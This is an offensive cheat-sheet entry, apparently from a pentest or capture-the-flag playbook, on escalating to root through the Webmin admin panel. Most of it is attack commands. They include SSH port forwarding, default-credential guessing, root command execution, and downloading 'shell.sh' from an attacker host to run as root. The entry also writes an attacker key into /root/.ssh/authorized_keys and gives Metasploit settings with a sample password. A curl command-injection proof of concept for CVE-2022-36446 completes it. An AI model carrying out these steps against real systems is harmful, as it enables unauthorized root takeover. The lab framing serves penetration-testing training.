title: Webmin — RCE via Command Shell, Upload, and CVEs
body:
Webmin is a web-based system administration panel that runs as root. Getting authenticated access to Webmin is almost always a direct path to root — it was designed to let admins run system commands, so it has native command execution built in. You don't need a CVE if you have valid credentials.

Webmin often runs on localhost-only (port 10000) and is invisible to external nmap scans. It shows up in linpeas under 'Active Ports' or as a running process: /usr/bin/perl /usr/share/webmin/miniserv.pl. When you see it, the credential to try is whatever you've found for the current user — service accounts, config file passwords, and sudo passwords all frequently work.

Common attack paths in priority order: (1) Tools → Command Shell if available, (2) Others → Upload and Download → Download from web to write files as root, (3) CVE-based RCE if unauthenticated or with limited auth.
cmd:
# ══════════════════════════════════════════════════
# 1 — DETECT WEBMIN
# ══════════════════════════════════════════════════
# In linpeas output — look for:
#   tcp LISTEN 0 4096 0.0.0.0:10000 0.0.0.0:*    ← port 10000
#   /usr/bin/perl /usr/share/webmin/miniserv.pl   ← process
#   Webmin entries in /etc/webmin/                 ← config files

# From the target shell:
ss -lntp | grep 10000
ps aux | grep webmin
cat /etc/webmin/version     # exact version number

# ══════════════════════════════════════════════════
# 2 — ACCESS (requires port forward from target to Kali)
# ══════════════════════════════════════════════════
# If Webmin is on 0.0.0.0:10000 but filtered externally:
ssh -L 10000:127.0.0.1:10000 <user>@<IP>
# Then: https://127.0.0.1:10000 in your browser
# Accept the self-signed cert.

# If Webmin is on 127.0.0.1:10000 (localhost only):
ssh -L 10000:127.0.0.1:10000 <user>@<IP>
# Same — forwards your local 10000 to the target's 10000.

# ══════════════════════════════════════════════════
# 3 — LOG IN
# ══════════════════════════════════════════════════
# Default creds: admin/admin, root/<rootpassword>
# Try the password from config.php / linpeas findings
# Webmin authenticates against PAM — system user passwords work.

# ══════════════════════════════════════════════════
# 4 — ROOT SHELL VIA COMMAND SHELL (fastest)
# ══════════════════════════════════════════════════
# In Webmin sidebar: Tools → Command Shell
# Runs commands as root directly in the browser.
# Get proof:
#   id
#   cat /root/proof.txt
#   cat /root/root.txt

# If Command Shell is not in the menu:
# Tools → Custom Commands → Create a new command

# ══════════════════════════════════════════════════
# 5 — ROOT FILE WRITE (Others → Upload and Download)
# ══════════════════════════════════════════════════
# Tools → Upload and Download → Download from web
# URL: http://<KALI>/shell.sh
# Destination: /tmp/shell.sh  (owned by root)
# Then execute via Command Shell or cron.

# Or: Upload to server → write authorized_keys as root:
# Upload your Kali public key to /root/.ssh/authorized_keys
# Then: ssh root@<IP>

# ══════════════════════════════════════════════════
# 6 — CVE-BASED RCE (unauthenticated or partial auth)
# ══════════════════════════════════════════════════
# Webmin 1.996 — CVE-2022-36446 (package update RCE):
searchsploit webmin 1.996
# Webmin 1.890 — CVE-2019-15107 (password change RCE, unauth):
searchsploit webmin 1.890
# Metasploit module:
# use exploit/linux/http/webmin_packageup_rce
# set RHOSTS 127.0.0.1
# set RPORT 10000
# set USERNAME svc-account
# set PASSWORD 'best&_#Password@2021!!!'
# set SSL true
# run

# PoC curl (CVE-2022-36446 — package update command injection):
curl -sk -X POST https://127.0.0.1:10000/package-updates/update.cgi \
  -b 'sid=<SESSION_COOKIE>' \
  --data 'u=apt&yes=1&updateall=1;id>/tmp/pwn'
cat /tmp/pwn
warn: Webmin runs as root — every action you take in it executes with full system privileges. Command Shell is the cleanest path but may be disabled by the admin. The Upload/Download module is almost always available and lets you write files anywhere on the filesystem as root. The version number is in /etc/webmin/version and on the dashboard — check it to pick the right CVE. The SSH local port forward must stay alive while you use Webmin; if the SSH session dies, the port closes.

choices.label: Wrote authorized_keys — SSH in as root
Need to port forward to reach Webmin first
